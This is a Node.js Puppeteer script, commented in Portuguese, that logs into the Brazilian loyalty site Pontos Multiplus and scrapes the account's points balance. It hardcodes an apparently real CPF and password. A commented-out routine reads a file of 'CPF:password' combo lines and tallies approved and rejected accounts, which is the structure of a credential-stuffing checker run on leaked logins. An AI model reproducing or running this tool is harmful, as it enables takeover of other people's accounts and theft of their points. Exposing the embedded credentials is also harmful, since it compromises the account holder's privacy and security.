const puppeteer = require('puppeteer');
const fsPromises = require('fs').promises;
const fs = require('fs');
const readline = require('readline');

const baseUrl = 'https://www.pontosmultiplus.com.br/portal/';
const srcFolder = './src/credentials.txt';

// Função que roda o robô
async function robo(pass, user) {
    // Configurações gerais do robô
    const browser = await puppeteer.launch({ headless: false });
    
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36');
    
    try {
        // Abrindo a página
        await page.goto(`${baseUrl}`, { waitUntil: "networkidle0" });
        await page.setCacheEnabled(false);

        //Preencher campo de usuário
        let inputUser = await page.waitForSelector('input[id=form-input--alias]');
        await inputUser.type(user);
        await page.click('button[type="submit"]');        
        
        // Preencher campo de senha
        let inputPass = await page.waitForSelector('input[id=form-input--password]');
        await inputPass.type(pass);
        await page.click('button[type="submit"]');

        //Esperando logar
        await page.waitForNavigation();

        //Esperando o campo de pontos carregar
        await page.waitForSelector('div[id=info-box-points]');

        let points = await page.$eval('div[id=info-box-points]', el => el.textContent);

        let pointsNormalized = points.replace(/(\r\n|\n|\r)/gm, "");
        await browser.close();

        console.log(pointsNormalized);

        return pointsNormalized;
    } catch (error) {
        await browser.close();
        console.log(error)
        
        return 'Ocorreu um erro ao verificar a URL';
    }
};

// robo('11111', '47548914814');
robo('Bru23600', '01839331763');




// Função para ler o arquivo das credenciais
// async function handleReadFile() {
//     const fileStream = fs.createReadStream(srcFolder);
//     const rl = readline.createInterface({
//         input: fileStream,
//         crlfDelay: Infinity
//     });
//     var carregadas = 0;
//     var testadas = 0;
//     var aprovados = 0;
//     var reprovados = 0;

//     // Iterando no arquivo, para ler cada linha e separar os dados
//     for await (const line of rl) {
//         carregadas = carregadas + 1;
//         if (line.includes(':')) {
//             var cpf = line.split(':')[0];
//             var senha = line.split(':')[1];

//             console.log(`${cpf} - ${senha}`);

//             // const response = await robo(cpf, senha);

//             // Salvado log das consultas
//             // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
//         }
//         if (line.includes('|')) {
//             var cpf = line.split('|')[0];
//             var senha = line.split('|')[1];

//             console.log(`${cpf} - ${senha}`);

//             // const response = await robo(cpf, senha);

//             // Salvado log das consultas
//             // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
//         }
//     }

//     console.log(`Carregadas: [${carregadas}]`)
// }

// // Função para formatar datas
// function formatDate(dateIn) {
//     const dateOut = dateIn.getDate() + '/' + (dateIn.getMonth() + 1) + '/' + dateIn.getFullYear() + ' ' + dateIn.getHours() + ':' + dateIn.getMinutes() + ':' + dateIn.getSeconds();

//     return dateOut;
// }

// handleReadFile();
